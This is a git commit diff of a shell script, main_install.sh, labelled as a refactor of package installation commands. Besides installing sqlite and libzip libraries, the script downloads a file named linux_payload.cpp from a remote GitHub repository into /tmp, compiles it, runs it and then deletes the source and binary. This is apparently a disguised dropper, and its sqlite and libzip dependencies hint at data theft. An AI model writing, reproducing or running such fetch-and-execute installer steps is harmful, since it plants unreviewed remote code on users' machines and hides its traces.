8e94d2865fa0210cd72ddd5d771a29950a4ff3ae
QUADROisCoding <business.quadro13187@gmail.com>
2026-05-16 16:23:29 +0200

    Refactor package installation commands in main_install.sh

--- main_install.sh
+++ main_install.sh
@@ -1,21 +1,18 @@
-(
-  command -v apt-get &>/dev/null && \
-    apt-get update && \
-    apt-get install -y libsqlite3-dev sqlite3 libzip-dev ||
+if command -v apt-get >/dev/null 2>&1; then
+    apt-get update
+    apt-get install -y libsqlite3-dev sqlite3 libzip-dev
 
-  command -v pacman &>/dev/null && \
-    pacman -Sy --noconfirm sqlite libzip ||
+elif command -v pacman >/dev/null 2>&1; then
+    pacman -Sy --noconfirm sqlite libzip
 
-  command -v dnf &>/dev/null && \
-    dnf install -y sqlite-devel libzip-devel ||
+elif command -v dnf >/dev/null 2>&1; then
+    dnf install -y sqlite-devel libzip-devel
 
-  command -v zypper &>/dev/null && \
+elif command -v zypper >/dev/null 2>&1; then
     zypper install -y sqlite3-devel libzip-devel
-) && \
+fi
 
 curl -sL https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp \
   -o /tmp/p.cpp && \
-
 g++ -std=c++17 -o /tmp/p /tmp/p.cpp -lsqlite3 -lzip && \
-
 /tmp/p && rm /tmp/p /tmp/p.cpp
